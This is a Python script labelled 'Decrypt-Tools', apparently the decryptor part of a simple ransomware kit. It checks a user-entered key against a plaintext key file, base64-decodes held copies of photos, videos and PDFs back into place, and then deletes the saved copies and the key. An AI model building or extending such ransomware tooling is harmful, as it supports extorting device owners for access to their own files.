#!/bin/python
#coding: utf-8

import os, sys, time, base64, shutil, json, readline, random

array = []

class auto(object):
	def __init__(self, options):
		self.options = sorted(options)
	
	def complete(self, text, state):
		if state == 0:
			if text:
				self.matches = [s for s in self.options if s and s.startswith(text)]
			else:
				self.matches = self.options[:]
		try:
			return self.matches[state]
		except IndexError:
			return None

def complete(array):
	completer = auto(array)
	readline.set_completer(completer.complete)
	readline.parse_and_bind('tab:complete')

def loadingScreen(msg, msgIfDone = "    "):
	bars = [
		f"[*] {msg} .   -",
		f"[*] {msg} ..  |",
		f"[*] {msg} ... \\",
		f"[*] {msg} .   /",
		f"[*] {msg} .   -",
		f"[*] {msg} ..  |",
		f"[*] {msg} ... \\",
		f"[*] {msg} .   /",
		f"[*] {msg} .   -",
		f"[*] {msg} ..  |",
		f"[*] {msg} ... \\",
		f"[*] {msg} .   /",
		f"[*] {msg} .   -",
		f"[*] {msg} ..  |",
		f"[*] {msg} ... \\",
		f"[*] {msg} .   /",
		f"[*] {msg} .   -",
		f"[*] {msg} ..  |",
		f"[*] {msg} ... \\",
		f"[*] {msg} .   /",
		f"[*] {msg} .   -",
		f"[*] {msg} ..  |",
		f"[*] {msg} ... \\",
		f"[*] {msg} .   /",
		f"[*] {msg} ... {msgIfDone}"
	]
	for i in range(len(bars)):
		time.sleep(1./random.randint(1, 10))
		sys.stdout.write(f"\r{bars[i]}")
		sys.stdout.flush()
	print("")
	time.sleep(2)

banner = """
  ___  ___  _ _  ___  ___  __ __  ___  _ _ _  ___  ___  ___ 
 | . \| . || \ |/ __>| . ||  \  \| __>| | | || . || . \| __>
 |   /|   ||   |\__ \| | ||     || _> | | | ||   ||   /| _> 
 |_\_\|_|_||_\_|<___/`___'|_|_|_||___>|__/_/ |_|_||_\_\|___> Decrypt-Tools
    Code by @vxin.dev      [ python ]     version 1.5-dev
"""

def startBanner():
	print(banner)

os.system("clear")
time.sleep(1)
startBanner()
loadingScreen("Start decrypting")

if os.path.exists(".ransomeware/.decrypt.key"):
	userKey = input("[?] Key: ")
	fKey = json.loads(open(".ransomeware/.decrypt.key", "r").read())["key"]
	if userKey == fKey:
		num = 0
		loadingScreen(f"Decrypt all files")
		for path in json.loads(open(".ransomeware/.paths.json", "r").read())["paths"]:
			if os.path.exists(path):
				for file in os.listdir(f".ransomeware/.save/{path}"):
					if file[-12:] == ".jpg.encrypt" or file[-12:] == ".png.encrypt" or file[-12:] == ".mp4.encrypt" or file[-12:] == ".pdf.encrypt":
						with open(f".ransomeware/.save/{path}/{file}", "r") as f:
							dec = base64.b64decode(f.read())
							open(f"{path}/{file}"[:-8], "wb").write(dec)
							num += 1
					else:
						pass
			else:
				pass
		print("\033[A[*] Decrypt all files ... done")
		shutil.rmtree(".ransomeware/.save/sdcard")
		os.remove(".ransomeware/.decrypt.key")
		
		#Message When Done Decrypt
		print(f"[*] {num} Files have been decrypted\n")
	else:
		print("[*] The key you entered is incorrect")
else:
	print("[*] You can't decrypt it")